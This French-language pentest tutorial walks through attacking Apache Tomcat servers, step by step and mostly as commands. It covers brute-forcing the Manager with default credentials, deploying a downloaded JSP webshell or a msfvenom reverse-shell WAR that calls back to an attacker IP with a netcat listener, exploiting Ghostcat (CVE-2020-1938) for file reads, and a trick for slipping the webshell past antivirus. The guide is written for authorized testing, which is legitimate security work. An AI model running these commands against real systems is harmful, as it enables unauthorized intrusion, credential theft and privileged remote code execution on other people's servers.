# Attaquer Apache Tomcat

Apache Tomcat est un serveur d'applications open-source concu pour heberger des applications Java (Servlets, JSP). Il est utilise par des frameworks comme Spring et des outils comme Gradle. Avec plus de 220 000 instances actives, Tomcat est un classique du pentest, en particulier en interne ou il tourne frequemment avec les identifiants par defaut et des privileges eleves (SYSTEM ou root).

## Pourquoi

Tomcat est souvent en tete de la categorie "High Value Targets" dans les rapports EyeWitness. En interne, il est frequent de trouver plusieurs instances sur un meme reseau, avec au moins une configuree avec des identifiants faibles. Un acces au Tomcat Manager permet de deployer un fichier WAR malveillant et d'obtenir un RCE immediat. Si Tomcat tourne en tant que SYSTEM sur un serveur Windows membre du domaine, c'est un acces directement exploitable pour l'enumeration Active Directory.

## Comment ca marche

### Identification

Tomcat revele sa version via les pages d'erreur (404), le repertoire `/docs`, et les headers HTTP.

```bash
# - Identifier Tomcat via la page de documentation
curl -s http://<IP_CIBLE>:8080/docs/ | grep Tomcat

# - Provoquer une erreur 404 pour obtenir la version
curl -s http://<IP_CIBLE>:8080/page_inexistante
```

### Structure d'une installation Tomcat

```
├── bin/              # Scripts de demarrage
├── conf/
│   ├── tomcat-users.xml   # Identifiants et roles
│   └── web.xml
├── lib/
├── logs/
├── webapps/          # Applications deployees
│   ├── manager/      # Interface d'administration
│   └── ROOT/
└── work/
```

Le fichier `tomcat-users.xml` contient les identifiants et les roles. Quatre roles cles :
- `manager-gui` : acces a l'interface web de gestion
- `manager-script` : acces a l'API HTTP
- `admin-gui` : acces au Host Manager
- `manager-status` : acces aux pages de statut uniquement

### Enumeration

```bash
# - Chercher les endpoints d'administration
gobuster dir -u http://<IP_CIBLE>:8080/ \
    -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

Les endpoints cibles sont `/manager/html` et `/host-manager/html`. L'authentification est de type HTTP Basic Auth.

### Brute force du Tomcat Manager

{% tabs %}
{% tab title="Metasploit" %}
```bash
# - Brute force avec le module Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP_CIBLE>
set RPORT 8080
set STOP_ON_SUCCESS true
run
```

Le module utilise les wordlists par defaut de Metasploit (`tomcat_mgr_default_userpass.txt`) qui contiennent les combinaisons les plus courantes : `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`, etc.
{% endtab %}
{% tab title="Script Python" %}
```bash
# - Brute force avec un script Python
python3 mgr_brute.py \
    -U http://<IP_CIBLE>:8080/ -P /manager \
    -u users.txt -p passwords.txt
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
L'authentification Tomcat Manager utilise HTTP Basic Auth. Les identifiants sont encodes en Base64 dans le header `Authorization`. On peut intercepter et decrypter les requetes avec Burp Suite pour verifier le comportement du scanner.
{% endhint %}

### RCE via upload de fichier WAR

Un fichier WAR (Web Application Archive) est un package d'application Java. Le Tomcat Manager permet de deployer un WAR qui sera automatiquement extrait et accessible comme une application web.

**Methode manuelle :**

```bash
# - Telecharger un webshell JSP
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

# - Creer le fichier WAR
zip -r backup.war cmd.jsp

# - Deployer via l'interface Manager (Browse > Deploy)
# - Acceder au webshell
curl http://<IP_CIBLE>:8080/backup/cmd.jsp?cmd=id
```

**Methode msfvenom :**

```bash
# - Generer un WAR avec reverse shell
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=<IP_ATTAQUANT> LPORT=4443 -f war > backup.war

# - Ecouter
nc -lnvp 4443

# - Deployer via le Manager, puis acceder a /backup/
```

{% hint style="warning" %}
Apres exploitation, utiliser le bouton "Undeploy" dans le Manager pour supprimer le WAR et le repertoire associe. Noter le chemin du fichier pour le rapport (generalement `/opt/tomcat/webapps/` ou `C:\Program Files\Apache Software Foundation\Tomcat\webapps\`).
{% endhint %}

### Ghostcat (CVE-2020-1938)

Cette vulnerabilite affecte le protocole AJP (Apache JServ Protocol) sur le port 8009. Toutes les versions de Tomcat avant 9.0.31, 8.5.51 et 7.0.100 sont vulnerables. Ghostcat permet de lire des fichiers dans le repertoire `webapps` sans authentification.

```bash
# - Verifier si AJP est ouvert
nmap -sV -p 8009,8080 <IP_CIBLE>

# - Exploiter pour lire le web.xml
python2.7 tomcat-ajp.lfi.py <IP_CIBLE> -p 8009 -f WEB-INF/web.xml
```

L'exploit ne peut lire que les fichiers dans le repertoire `webapps` (pas `/etc/passwd`), mais le `web.xml` et d'autres fichiers de configuration peuvent contenir des identifiants ou des informations sensibles.

## En pratique

```bash
# 1 - Identifier Tomcat et sa version
curl -s http://<IP_CIBLE>:8080/page_inexistante

# 2 - Tester les identifiants par defaut sur /manager/html
# tomcat:tomcat, admin:admin, tomcat:s3cret, admin:s3cret

# 3 - Si echec, brute force
use auxiliary/scanner/http/tomcat_mgr_login

# 4 - Deployer un WAR malveillant
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4443 -f war > shell.war

# 5 - Verifier le port AJP pour Ghostcat
nmap -sV -p 8009 <IP_CIBLE>
```

## Pieges et galeres

{% tabs %}
{% tab title="Manager" %}
- **Acces restreint par IP** : le Manager est souvent configure pour n'accepter que les connexions depuis `localhost`. Dans ce cas, un SSRF ou un acces local est necessaire
- **Acces refuse (403)** : meme avec les bons identifiants, le Manager peut retourner un 403. Verifier la configuration dans `context.xml` (pattern d'IP autorisees)
- **Pas de Manager** : si l'application Manager n'est pas deployee, le WAR upload n'est pas possible. Chercher d'autres vecteurs (Ghostcat, vulns applicatives)
{% endtab %}
{% tab title="WAR deploy" %}
- **Limite de taille** : certaines configurations limitent la taille des fichiers uploades. Generer un WAR minimal
- **Antivirus** : le webshell JSP classique est detecte par certains AV. Modifier des chaines de caracteres (ex: "Uploaded" en "uPlOaDeD") suffit souvent a contourner la detection
- **Nettoyage** : le bouton "Undeploy" supprime le WAR et le repertoire. Toujours verifier que le nettoyage a fonctionne
{% endtab %}
{% endtabs %}

## Retour terrain

Tomcat est l'une des decouvertes les plus appreciees en pentest. En interne, au moins une instance sur deux a des identifiants faibles. `tomcat:tomcat` et `admin:admin` sont les plus courants, suivis de `tomcat:s3cret`.

Tomcat tourne souvent avec des privileges eleves : `NT AUTHORITY\SYSTEM` sur Windows, `root` sur Linux. L'obtention d'un shell via un WAR malveillant donne generalement un acces privilegie sans escalade supplementaire.

Ghostcat (port 8009) est un bonus souvent present. Meme si l'exploitation est limitee a la lecture de fichiers dans `webapps`, elle peut reveler des identifiants de base de donnees ou des cles API stockees dans les fichiers de configuration.

## Memo express

| Technique | Outil / Commande | Prerequis |
|---|---|---|
| Fingerprint | Page 404, `/docs/` | Port Tomcat ouvert |
| Brute force | `tomcat_mgr_login` (MSF) | Endpoint `/manager/html` |
| WAR deploy | `msfvenom` + Manager GUI | Identifiants Manager |
| Webshell JSP | `cmd.jsp` + `zip -r` | Identifiants Manager |
| Ghostcat LFI | CVE-2020-1938 | Port AJP 8009 ouvert |
| Reverse shell | `java/jsp_shell_reverse_tcp` | Identifiants Manager |

***
